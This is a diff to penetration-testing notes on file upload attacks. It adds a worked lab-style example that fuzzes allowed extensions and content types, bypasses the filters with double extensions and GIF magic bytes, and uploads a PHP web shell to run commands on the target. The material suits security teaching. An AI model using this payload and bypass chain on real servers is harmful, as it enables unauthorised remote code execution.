@@ -16,6 +16,7 @@ This section documents common techniques for identifying and exploiting **file u
   - [Whitelist Filters](#whitelist-filters)
   - [Content-Type Filter](#content-type-filter)
   - [File Content Filter](#file-content-filter)
+  - [Exploitation Example -1](#exploitation-example---1)
 
 ---
 
@@ -634,9 +635,9 @@ Common file signatures include:
 | File Type       | ASCII Signature       | HEX Signature   |
 | ----------------| --------------------- |---------------- |
 | `GIF`           | `GIF87a` or `GIF89a`  | 47 49 46 38     |
-| `PNG`           | `.PNG`                | 89 50 4e 47     |
+| `PNG`           | `.PNG`                | 89 50 4E 47     |
 | `BMP`           | `BM`                  | 42 4D           |
-| `JPG`           |                       | ff d8 ff e0     |
+| `JPG`           |                       | FF D8 FF E0     |
 
 When an application validates files based on `MIME` type, modifying the file’s magic bytes can be enough to bypass the filter.
 
@@ -659,4 +660,137 @@ The file is now recognized as a GIF image by the `MIME` filter. This technique d
 
 ## Exploitation Example - 1
 
-This example ties everything together. The targets file upload functionality is protected by front-end, blacklist, whitelist, content-type and MIME-type filters. 
+This example demonstrates a full exploitation chain against a file upload functionality protected by multiple layered defenses, including:
+
+- Front-end extension validation
+- Back-end blacklist and whitelist filters
+- Content-Type validation
+- MIME-type (magic byte) validation
+
+Inspection of the page source reveals a **front-end extension filter** that restricts uploads to the following file types:
+
+- `.jpg`
+- `.jpeg`
+- `.png`
+
+![Filtered output](images/exploitation.PNG)
+
+Uploading a legitimate `.png` image succeeds, confirming the expected behavior.
+
+![Filtered output](images/exploitation2.PNG)
+
+To identify additional server-side validation, the file extension is modified from `.png` to `.php` while keeping the file content unchanged.
+
+This causes an error:
+
+```
+Extension not allowed
+```
+
+Because the file content is still a valid PNG image, this confirms the presence of a **back-end extension filter**.
+
+![Filtered output](images/exploitation3.PNG)
+
+We fuzz the upload endpoint for permitted extensions using `ffuf`, filtering on the error message:
+
+```bash
+ffuf -w web-extensions.txt:FUZZ -request req.txt -request-proto http -fr "Extension not allowed"
+```
+
+The scan reveals several accepted extensions. The most relevant PHP-related extensions are:
+
+- `.phtml`
+- `.phar`
+- `.pht`
+
+![Filtered output](images/exploitation4.PNG)
+
+Next, we test whether the application validates the `Content-Type` header. Changing the header from `image/png` to `text/plain` results in:
+
+```
+Only images are allowed
+```
+
+This confirms the presence of a `Content-Type` filter.
+
+![Filtered output](images/exploitation5.PNG)
+
+We fuzz for accepted content types:
+
+```bash
+ffuf -w web-all-content-types.txt:FUZZ -request req.txt -request-proto http -fr "Only images are allowed"
+```
+
+Only the following values are accepted:
+
+- `image/jpeg`
+- `image/png`
+- `image/gif`
+
+![Filtered output](images/exploitation6.PNG)
+
+At this stage, the application enforces:
+
+- Extension validation
+- Content-Type validation
+- MIME-type validation
+
+Even when using:
+
+- An allowed extension
+- An allowed Content-Type
+- Embedded PHP code
+
+…the upload is still rejected:
+
+```
+Only images are allowed
+```
+
+![Filtered output](images/exploitation7.PNG)
+
+This indicates that magic bytes are being inspected.
+
+To bypass the remaining restrictions, we combine several techniques:
+
+- Double extensions
+- Allowed image extension first
+- Allowed PHP-related extension second
+- Valid image magic bytes
+
+The following filenames successfully bypass the filters:
+
+```
+shell.gif.phar
+shell.gif.phtml
+shell.gif.pht
+```
+
+We prepend the `GIF8` magic bytes to satisfy MIME-type validation.
+
+Example payload:
+
+```
+------WebKitFormBoundarynzyLbgp5Pm1zyjLx
+Content-Disposition: form-data; name="uploadFile"; filename="shell.gif.phar"
+Content-Type: image/gif
+
+GIF8
+<?php system($_GET["cmd"]); ?>
+
+------WebKitFormBoundarynzyLbgp5Pm1zyjLx--
+```
+
+![Filtered output](images/exploitation8.PNG)
+
+The uploaded file is now accessible and executable. Interacting with the web shell confirms successful code execution:
+
+```
+http://83.136.253.5:49702/profile_images/shell.gif.phar?cmd=id
+```
+
+All upload defenses were successfully bypassed, resulting in remote code execution on the target server.
+
+![Filtered output](images/exploitation9.PNG)
+
+---
